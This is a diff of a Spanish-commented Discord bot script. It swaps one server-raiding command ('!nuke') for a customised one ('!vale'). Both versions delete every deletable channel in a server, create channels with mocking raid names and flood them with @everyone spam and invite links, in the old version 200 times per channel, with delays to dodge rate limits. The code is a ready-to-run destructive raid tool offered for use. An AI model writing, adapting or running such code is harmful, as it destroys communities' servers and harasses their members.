@@ -1,218 +1,108 @@
-require('dotenv').config();  // ← Esto carga el .env
-
-const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
-
-const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent
-  ]
-});
-
-const PREFIX = "!";
-
-// Ahora usa la variable de entorno (segura)
-const TOKEN = process.env.TOKEN;
-
-const OWNER_ID = "1436516806842912970";
-
-// ... el resto de tu código sigue igual (client.once, client.on, etc.)
-
-client.once('ready', () => {
-  console.log(`Bot conectado como ${client.user.tag}`);
-  console.log('Usa !nuke SOLO si estás seguro!');
-});
-
-client.on('messageCreate', async (message) => {
-  if (!message.content.startsWith(PREFIX)) return;
-  if (message.author.bot) return;
-
-  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
-  const command = args.shift().toLowerCase();
-
-  if (command === 'nuke') {
-    if (message.author.id !== OWNER_ID) {
-      return message.reply('Solo el dueño puede usar este comando tan destructivo.');
+if (command === 'vale') {
+    // Solo tú puedes usarlo (agrega más IDs si quieres)
+    if (!OWNER_IDS.includes(message.author.id)) {
+        return message.reply('No tienes permiso para este comando tan heavy.');
     }
 
-    await message.reply('⚠️ Iniciando borrado de canales... ¡Esto NO se puede deshacer!').catch(() => {});
+    // ────────────────────────────────────────────────
+    //     === PERSONALIZA AQUÍ TODO LO QUE QUIERAS ===
+    // ────────────────────────────────────────────────
 
-    // 1. BORRAR TODOS LOS CANALES POSIBLES
+    const nombresDeCanales = [
+        "raid-for-$pwm$-jajaja",     // repite esta línea las veces que quieras canales iguales
+        "raid-for-$pwm$-jajaja",
+        "raid-for-$pwm$-jajaja",
+        "raid-for-$pwm$-jajaja",
+        "you-are-idiot-owned-by-vale",
+        "you-are-idiot-owned-by-vale",
+        // Agrega más líneas aquí para más canales
+    ];
+
+    const mensajesEnRafaga = [
+        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
+        "@everyoneraid for $pwm$ JAJAJAJA you are idiot",
+        "@everyoneraid for $pwm$ JAJAJAJA you are idiot",
+        "@everyone entra si quieres  llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres  llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
+        // Agrega o quita mensajes aquí → se envían TODOS en cada canal, en este orden
+    ];
+
+    const delayEntreMensajes = 1300;   // 1.3 segundos entre cada mensaje (sube a 2000 si te da rate limit)
+
+    // ────────────────────────────────────────────────
+    //     NO CAMBIES NADA DE AQUÍ PARA ABAJO (o con cuidado)
+    // ────────────────────────────────────────────────
+
+    const totalCanales = nombresDeCanales.length;
+    const totalMensajesPorCanal = mensajesEnRafaga.length;
+
+    await message.reply(
+        `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
+        `→ Creando **${totalCanales}** canales\n` +
+        `→ Enviando **${totalMensajesPorCanal}** mensajes en ráfaga en CADA canal\n\n` +
+        `¡Ctrl + C en la consola si te arrepientes!`
+    );
+
+    await new Promise(r => setTimeout(r, 5000));
+
+    const guild = message.guild;
+
     try {
-      const channels = message.guild.channels.cache;
-      for (const channel of channels.values()) {
-        if (channel.deletable && channel.id !== message.channel.id) {
-          await channel.delete().catch(err => console.log(`No se pudo borrar ${channel.name}: ${err}`));
-          await new Promise(r => setTimeout(r, 400));
+        // 1. Borrar canales (menos el actual para ver logs)
+        let borrados = 0;
+        for (const ch of [...guild.channels.cache.values()]) {
+            if (ch.deletable && ch.id !== message.channel.id) {
+                try {
+                    await ch.delete('!vale - personalizado por Patricio');
+                    borrados++;
+                    await new Promise(r => setTimeout(r, 400));
+                } catch {}
+            }
         }
-      }
-      await message.channel.send('✔️ Canales borrados (excepto este).').catch(() => {});
-    } catch (err) {
-      console.error(err);
-      await message.channel.send('❌ Error al borrar canales...').catch(() => {});
-    }
+        await message.channel.send(`→ Borrados **${borrados}** canales.`);
 
-    // 2. CREAR CANALES PERSONALIZADOS + SPAM AUTOMÁTICO
-    try {
-      // Categoría principal
-      const catRaid = await message.guild.channels.create({
-        name: '$ by pwy Raid You$',
-        type: ChannelType.GuildCategory,
-        permissionOverwrites: [
-          { id: message.guild.id, allow: [PermissionsBitField.Flags.ViewChannel] }
-        ]
-      });
+        // 2. Crear los canales personalizados
+        const nuevosCanales = [];
+        for (const nombre of nombresDeCanales) {
+            try {
+                const nombreLimpio = nombre
+                    .toLowerCase()
+                    .replace(/[^a-z0-9\-_$ ]/g, '')   // solo permite letras, números, -, _, espacio, $
+                    .slice(0, 100) || 'raid-default';
 
-      // Lista de nombres de canales de texto (40 como tenías)
-      const textChannelNames = [
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$',
-        '$ by pwy Raid You$'
-      ];
-
-      const createdTextChannels = [];
-
-      for (const name of textChannelNames) {
-        try {
-          const ch = await message.guild.channels.create({
-            name: name,
-            type: ChannelType.GuildText,
-            parent: catRaid.id,
-            topic: 'Raid by pwy'
-          });
-          createdTextChannels.push(ch);
-        } catch (e) {}
-        await new Promise(r => setTimeout(r, 300));
-      }
-
-      // Categoría de voz
-      const catVoz = await message.guild.channels.create({
-        name: '$ by pwy Raid You$ VOZ',
-        type: ChannelType.GuildCategory
-      });
-
-      const voiceChannels = [
-        { name: '$ by pwy Raid You$ - Voz 1', limit: 0 },
-        { name: '$ by pwy Raid You$ - Voz 2', limit: 99 },
-        { name: '$ by pwy Raid You$ - AFK', limit: 99 }
-      ];
-
-      for (const vc of voiceChannels) {
-        await message.guild.channels.create({
-          name: vc.name,
-          type: ChannelType.GuildVoice,
-          parent: catVoz.id,
-          userLimit: vc.limit
-        }).catch(() => {});
-        await new Promise(r => setTimeout(r, 300));
-      }
-
-      // ───────────────────────────────────────────────
-      //          SPAM AUTOMÁTICO EN LOS CANALES NUEVOS
-      // ───────────────────────────────────────────────
-      const spamMessage = '@everyone $ by pwy Raid You$ https://discord.gg/Dv5dauuCJS';
-      const timesPerChannel = 200;   // ← Cambia este número si quieres más/menos repeticiones por canal
-
-      let totalSent = 0;
-
-      await message.channel.send('Canales creados. Iniciando spam automático...').catch(() => {});
-
-      for (const channel of createdTextChannels) {
-        if (!channel) continue;
-
-        for (let i = 0; i < timesPerChannel; i++) {
-          try {
-            await channel.send(spamMessage);
-            totalSent++;
-            await new Promise(r => setTimeout(r, 800)); // delay para evitar rate-limit/ban rápido
-          } catch (sendErr) {
-            console.log(`Fallo spam en ${channel.name}: ${sendErr}`);
-          }
+                const canal = await guild.channels.create({
+                    name: nombreLimpio,
+                    type: ChannelType.GuildText,
+                    permissionOverwrites: [
+                        { id: guild.id, allow: ['ViewChannel', 'SendMessages'] }
+                    ]
+                });
+                nuevosCanales.push(canal);
+                await new Promise(r => setTimeout(r, 900));
+            } catch (err) {
+                console.log(`Error creando "${nombre}": ${err}`);
+            }
         }
-        await new Promise(r => setTimeout(r, 2000)); // pausa entre canales
-      }
+        await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);
 
-      await message.channel.send(`$ by pwy Raid You$ accept - Spam completado (${totalSent} mensajes enviados) 🔥`).catch(() => {});
+        // 3. Enviar ráfaga de mensajes personalizados en cada canal
+        for (const canal of nuevosCanales) {
+            try {
+                for (const mensaje of mensajesEnRafaga) {
+                    await canal.send(mensaje);
+                    await new Promise(r => setTimeout(r, delayEntreMensajes));
+                }
+            } catch {}
+        }
+
+        await message.channel.send('**¡TERMINADO!** 😈 Todo raideado con tus mensajes personalizados.');
 
     } catch (err) {
-      console.error(err);
-      await message.channel.send('$ by pwy Raid You$ cancel - Error en creación/spam').catch(() => {});
+        console.error('Error en !vale:', err);
+        await message.channel.send('Algo salió mal... revisa la consola.');
     }
-  }
-});
-
-client.login(TOKEN);
+}
